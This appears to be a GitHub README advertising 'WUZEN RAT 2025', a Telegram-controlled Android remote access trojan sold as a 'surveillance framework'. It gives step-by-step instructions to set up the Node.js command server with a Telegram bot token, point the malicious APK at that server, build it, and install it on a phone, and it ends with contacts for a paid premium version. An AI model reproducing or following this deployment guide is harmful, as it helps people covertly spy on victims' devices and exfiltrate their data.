<h1 align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Microsoft+YaHei&size=28&duration=4000&color=FF0000&center=true&vCenter=true&width=500&lines=%E6%AD%A6%E7%A5%9E+WUZEN+RAT+2025;GHOST+HVNC;Telegram+Based+RAT" alt="Wuzen Title">
</h1>

<div align="center">

---
![image](https://github.com/user-attachments/assets/89fdb7c6-5121-4570-b961-ecc4f82024d3)
---
  
**高级安卓监控框架 | Advanced Android Surveillance Framework**

![Version](https://img.shields.io/badge/版本-2025.1-FF0000?style=flat-square)
![Android](https://img.shields.io/badge/Android-8.0+-00FF00?style=flat-square)

</div>

---

## 🚀 项目结构 | Project Structure

**两个主要组件 | Two main components:**
1. 🌐 网络服务器 (Node.js) | Web Server (Node.js)
2. 📱 安卓应用 (通过 build.sh 构建) | Android App (built via build.sh)

--- 
![image](https://github.com/user-attachments/assets/8c1aeeee-623e-4bbb-ac88-c49e3d60a400)
---
## 🛠 系统要求 | System Requirements

### 🌐 服务器要求 | Server Requirements
* Node.js (v22 或更新) | Node.js (v18 or newer)
* npm (随 Node.js 附带) | npm (comes with Node.js)
* Telegram 机器人令牌和聊天ID | Telegram Bot Token and Chat ID
* 服务器或托管平台 | Server or hosting platform

### 📱 应用要求 | App Requirements
* Linux 或 WSL | Linux or WSL
* Java JDK 11 或更新 | Java JDK 11 or newer
* Android SDK
* Gradle
* (可选) ADB 用于安装 APK | (Optional) ADB for installing APK

---

## 🌐 服务器设置 | Server Setup

### 1. 安装依赖 | Install Dependencies
```bash
npm install
```

2. 配置服务器 | Configure Server

编辑 index.js 文件 | Edit index.js file:

```javascript
const token = "";        // 机器人代币 | Bot Token
const chatId = "";       // 聊天 ID | Chat ID  
const host = "";         // 服务器地址 | Server Host
const PORT = 3000;       // 端口 | Port
```

3. 启动服务器 | Start Server

```bash
node index.js
```

4. (可选) 后台运行 | (Optional) Background Run

```bash
npm install -g pm2
pm2 start index.js
```

---

📱 应用设置 | App Setup

1. 配置服务器URL | Configure Server URL

打开文件 | Open file:
app/src/main/java/com/yiwugou/yiwukanz/MainService.java

找到并修改 | Find and modify:

```java
public static final String serverUrl = ""; // 在这里更改您的网址 | Change your URL here
```

2. 构建APK | Build APK

```bash
chmod +x build.sh
./build.sh
```

3. 安装应用 | Install App

```bash
adb install app/build/outputs/apk/release/app-release.apk
```

或手动复制APK到手机 | Or manually copy APK to phone

---

📞 联系支持 | Contact Support

专业版机器人 | Premium Bot: @xwuzen_bot
官方频道 | Official Channel: @wuzenhq
技术支持 | Support: @wuzensupport

---

<div align="center">

武神 WUZEN 2025 - 重新定义移动监控
Wuzen 2025 - Redefining Mobile Surveillance

</div>
